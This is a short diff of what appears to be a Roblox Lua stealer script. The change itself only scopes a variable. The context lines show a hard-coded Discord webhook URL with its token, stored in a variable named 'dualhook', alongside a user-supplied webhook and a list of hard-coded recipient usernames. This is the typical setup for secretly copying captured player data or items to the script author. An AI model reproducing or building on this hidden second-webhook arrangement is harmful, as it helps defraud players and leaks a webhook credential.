@@ -1,5 +1,5 @@
 local username = {"namnnni2", "bald", getfenv().Username}
-webhook = getfenv().Webhook
+local webhook = getfenv().Webhook
 local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
 local embed = getfenv().Username
 
